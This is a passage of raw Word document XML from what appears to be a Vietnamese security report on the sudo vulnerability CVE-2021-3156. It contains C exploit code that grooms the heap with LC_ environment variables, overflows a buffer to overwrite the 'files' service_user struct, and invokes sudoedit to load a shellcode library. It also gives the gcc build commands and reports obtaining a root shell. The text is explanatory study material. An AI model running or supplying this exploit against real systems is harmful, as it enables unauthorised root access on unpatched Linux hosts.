    </w:p>
    <w:p w14:paraId="1F72B2CD" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="1" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E4233C6"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w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>argv[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>] = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CC8E97B" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="1" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">        "sudoedit",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B1D026"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"-s",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A8B320C"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buf,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="290BD3F2"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NULL};</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45CEBFBC" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="1" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="279E5A74"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Use some LC_ vars for heap Feng-Shui.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0100CEBD"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This should allocate the target service_user struct in the path of the overflow.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1707DDCA"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messages[0xe0] = {"LC_MESSAGES=en_GB.UTF-8@"};</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23D4398B"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memset(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>messages + strlen(messages), 'A', 0xb8);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FB06074" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="1" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C7100E5"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telephone[0x50] = {"LC_TELEPHONE=C.UTF-8@"};</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="263C1C9C"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memset(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>telephone + strlen(telephone), 'A', 0x28);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B224C82" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="1" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1DDE0E24"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measurement[0x50] = {"LC_MEASUREMENT=C.UTF-8@"};</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AD138BE"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memset(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>measurement + strlen(measurement), 'A', 0x28);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="777ABDAB" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="1" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3ACB31A6"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This environment variable will be copied onto the heap after the overflowing chunk.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="203C6FC5"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Use it to bridge the gap between the overflow and the target service_user struct.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49989076"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overflow[0x500] = {0};</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CEAEC09"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memset(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>overflow, 'X', 0x4cf);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B6E080F"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strcat(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>overflow, "\\");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27380BC8" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="1" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C28B373"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Overwrite the 'files' service_user struct's name with the path of our shellcode library.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30791AAB" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="1" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    // The backslashes write nulls which are needed to dodge a couple of crashes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3100EE6F"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char* </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>envp[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>] = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BC7E9C6"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overflow,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F60156B"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 "\\", "\\", "\\", "\\", "\\", "\\",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74225E18"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"XXXXXXX\\",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6580AFB5"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 "\\", "\\", "\\", "\\", "\\", "\\",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14E1AFAA"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 "\\", "\\", "\\", "\\", "\\",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="311CB85E"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"x/x\\",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35D9BD0D"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"Z",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D365976"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messages,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2912F77C"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telephone,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57AD0E03"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measurement,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24FF6B3F"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NULL};</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75C227C6" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="1" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="347CD99B"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 Invoke sudoedit with our argv &amp; envp.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34B4E0C2" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="1" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>execve(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>"/usr/bin/sudoedit", argv, envp);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A8C55F5" w14:textId="023DF5AE" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="1" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34CA62A2" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:ind w:firstLine="709"/>
      </w:pPr>
      <w:r>
        <w:t>Trước tiên, ta cần khởi tạo một mảng bộ đệm buf có kích thước 0xf0 (240 byte), với phần lớn bộ đệm được lấp đầy bởi ký tự 'Y'. Việc này giúp tạo ra không gian trống trong bộ nhớ mà sau này sẽ bị ghi đè. Tiếp theo, thêm một ký tự \ vào cuối mảng, điều này kích hoạt sự tràn bộ đệm khi hàm strcat cố gắng nối thêm ký tự vào mảng buf.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5336B765" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:r>
        <w:t>Một mảng argv được thiết lập với các đối số cần thiết cho lệnh sudoedit, bao gồm:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75266FA9" w14:textId="36D4C596" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>"sudoedit": Lệnh chính được sử dụng để khởi chạy sudoedit.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E969BA8" w14:textId="503A9E54" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>"-s": Tham số này chỉ định chế độ an toàn của sudoedit.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52DE6036" w14:textId="63D48E00" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>buf: Mảng bộ đệm đã được chuẩn bị, chứa chuỗi gây tràn bộ đệm.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="381DCBD6" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03"/>
    <w:p w14:paraId="298B5CF0" w14:textId="382AA065" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:ind w:firstLine="709"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Để đảm bảo rằng sự tràn bộ đệm sẽ ghi đè lên các cấu trúc dữ liệu quan trọng, ta chuẩn bị một số biến môi trường như LC_MESSAGES, LC_TELEPHONE, và LC_MEASUREMENT. Các biến này sẽ được sử dụng để thay đổi cách thức phân bổ bộ nhớ và sắp xếp các đối tượng trên heap theo kỹ thuật “heap Feng Shui”. Các mảng này được lấp đầy bởi ký tự 'A' để "chiếm dụng" bộ nhớ và sắp xếp lại bộ nhớ heap một cách có lợi cho cuộc tấn công.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FF3498B" w14:textId="7119E44D" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:ind w:firstLine="709"/>
      </w:pPr>
      <w:r>
        <w:t>Một mảng overflow có kích thước lớn (0x500 byte) được tạo ra để ghi đè lên vùng bộ nhớ của heap. Mảng này được lấp đầy bằng ký tự 'X' và kết thúc bằng một ký tự backslash (\), giúp tạo điều kiện cho việc ghi đè chính xác vào các cấu trúc dữ liệu cần thiết. Mã exploit thay đổi giá trị của “files” trong “service_user struct” trên heap bằng cách ghi đè vào vùng bộ nhớ của nó. Các giá trị trong overflow sẽ ghi đè lên một phần của heap chứa tên của “files”, từ đó thay đổi đường dẫn tới thư viện shellcode mà kẻ tấn công muốn thực thi.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F370A18" w14:textId="13593057" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:ind w:firstLine="709"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Cuối cùng, hàm </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>execve(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>"/usr/bin/sudoedit", argv, envp); được gọi để thực thi sudoedit với các đối số và môi trường đã được chuẩn bị trước. Nhờ vào sự thay đổi trong bộ nhớ heap, kẻ tấn công có thể điều khiển chương trình và thực thi mã của mình với quyền root.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B018E55" w14:textId="64C3755B" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Tiến hành khai thác</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AF3FC4D" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:ind w:firstLine="709"/>
      </w:pPr>
      <w:r>
        <w:t>Trước tiên, chúng ta tạo một thư mục mới để chứa thư viện động (shared library) chứa mã shellcode sẽ được sử dụng trong quá trình khai thác. Điều này được thực hiện bằng lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D22F92D" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="4" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="auto"/>
        </w:pBdr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>mkdir libnss_x</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15E11B86" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:ind w:firstLine="709"/>
      </w:pPr>
      <w:r>
        <w:t>Biên dịch mã shellcode đã chuẩn bị trước vào thư viện động (shared library). Để đảm bảo rằng mã shellcode có thể được thực thi với quyền root, chúng ta sử dụng các tùy chọn biên dịch sau:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77E99401" w14:textId="54150996" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="004236C1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>O3: Tối ưu hóa mã nguồn trong quá trình biên dịch.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56DFF0A2" w14:textId="461D9E5A" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="004236C1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>shared: Biên dịch thư viện động.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="681F63DF" w14:textId="7950BAE2" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="004236C1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>nostdlib: Không sử dụng thư viện chuẩn.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="174746DE" w14:textId="291E684A" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="004236C1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>fno-stack-protector: Vô hiệu hóa bảo vệ stack.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="247678DC" w14:textId="0E939FD9" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="004236C1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>z execstack: Cho phép thực thi mã trên stack.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70074AF6" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="004236C1">
      <w:pPr>
        <w:ind w:firstLine="709"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Lệnh biên dịch để tạo thư viện shellcode (x.so.2) là:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="712C8CFD" w14:textId="3B1ABADF" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="004236C1">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="4" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:t>gcc -O3 -shared -nostdlib -fno-stack-protector -z execstack -o libnss_x/x.so.2 shellcode.c</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5529C0F1" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="004236C1">
      <w:pPr>
        <w:ind w:firstLine="709"/>
      </w:pPr>
      <w:r>
        <w:t>Biên dịch mã khai thác chính để thực hiện tấn công và lợi dụng lỗ hổng CVE-2021-3156. Mã khai thác sẽ sử dụng thư viện shellcode vừa tạo để thực thi shellcode với quyền root. Lệnh biên dịch mã khai thác là:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DDBC148" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="004236C1">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="4" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="auto"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:t>gcc -O3 -o exploit exploit.c</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3292B7EE" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="004236C1">
      <w:pPr>
        <w:ind w:firstLine="709"/>
      </w:pPr>
      <w:r>
        <w:t>Trong đó:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41A6F7F5" w14:textId="795F111A" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="004236C1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>O3: Tối ưu hóa mã nguồn trong quá trình biên dịch.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B24AC3B" w14:textId="6F6E5F0E" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="007B3B03">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>o exploit: Chỉ định tên tệp thực thi sau khi biên dịch.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32F557D7" w14:textId="77777777" w:rsidR="004236C1" w:rsidRDefault="004236C1" w:rsidP="004236C1">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300" wp14:anchorId="5C0E33A3" wp14:editId="71C09DDD">
            <wp:extent cx="5758815" cy="1207882"/>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7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5758815" cy="1207882"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0535B5BE" w14:textId="2B29C113" w:rsidR="004236C1" w:rsidRDefault="004236C1" w:rsidP="00F440BB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:bookmarkStart w:id="43" w:name="_Toc184042063"/>
      <w:r>
        <w:t xml:space="preserve">Hình 3. </w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:instrText xml:space="preserve"> SEQ Hình_3. \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="004236C1">
        <w:t>Các câu lệnh biên dịch file thực thi</w:t>
      </w:r>
      <w:bookmarkEnd w:id="43"/>
    </w:p>
    <w:p w14:paraId="24A8FE34" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="004236C1">
      <w:pPr>
        <w:ind w:firstLine="709"/>
      </w:pPr>
      <w:r>
        <w:t>Sau khi biên dịch tệp khai thác (exploit) có thể trực tiếp chạy tệp này trên hệ thống mục tiêu để thực hiện khai thác. Tệp này sẽ tự động sử dụng các kỹ thuật gây tràn bộ đệm và ghi đè các cấu trúc bộ nhớ cần thiết, kích hoạt việc thực thi shellcode</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BAE3BBE" w14:textId="6B150AEB" w:rsidR="004236C1" w:rsidRDefault="004236C1" w:rsidP="004236C1">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300" wp14:anchorId="23C80C53" wp14:editId="4C8D89D1">
            <wp:extent cx="5267325" cy="1242695"/>
            <wp:effectExtent l="0" t="0" r="5715" b="698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8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5267325" cy="1242695"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="022CCB6A" w14:textId="7B238A45" w:rsidR="007B3B03" w:rsidRDefault="004236C1" w:rsidP="00F440BB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:bookmarkStart w:id="44" w:name="_Toc184042064"/>
      <w:r>
        <w:t xml:space="preserve">Hình 3. </w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:instrText xml:space="preserve"> SEQ Hình_3. \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="004236C1">
        <w:t>Lấy được shell với quyền root sau khi chạy mã thực thi</w:t>
      </w:r>
      <w:bookmarkEnd w:id="44"/>
    </w:p>
    <w:p w14:paraId="3B0C3BD8" w14:textId="42A2FE93" w:rsidR="004236C1" w:rsidRDefault="004236C1" w:rsidP="004236C1">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Kết luận</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A9B8D1E" w14:textId="77777777" w:rsidR="004236C1" w:rsidRDefault="004236C1" w:rsidP="004236C1">
      <w:pPr>
        <w:ind w:firstLine="709"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Qua thử nghiệm, lỗ hổng này có thể được khai thác thông qua các thao tác trên chương trình sudoedit, đặc biệt là khi dữ liệu đầu vào không được kiểm tra </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>đúng cách. Kẻ tấn công có thể gây ra tràn bộ đệm heap bằng cách cung cấp dữ liệu vượt quá kích thước bộ đệm đã được cấp phát. Quá trình này dẫn đến việc ghi đè các cấu trúc bộ nhớ quan trọng, cho phép thực thi mã độc (shellcode) với quyền root.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C81B6C1" w14:textId="77777777" w:rsidR="004236C1" w:rsidRDefault="004236C1" w:rsidP="004236C1">
      <w:pPr>
        <w:ind w:firstLine="709"/>
      </w:pPr>
      <w:r>
        <w:t>Việc khai thác CVE-2021-3156 không yêu cầu quyền root ban đầu, chỉ cần quyền truy cập với quyền hạn người dùng thông thường. Điều này làm cho lỗ hổng này trở thành một mối đe dọa nghiêm trọng đối với các hệ thống không được cập nhật, vì kẻ tấn công có thể dễ dàng khai thác mà không cần phải có sự can thiệp của quản trị viên.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F4DD42F" w14:textId="574CD185" w:rsidR="004236C1" w:rsidRPr="004236C1" w:rsidRDefault="004236C1" w:rsidP="004236C1">
      <w:pPr>
        <w:ind w:firstLine="709"/>
      </w:pPr>
      <w:r>
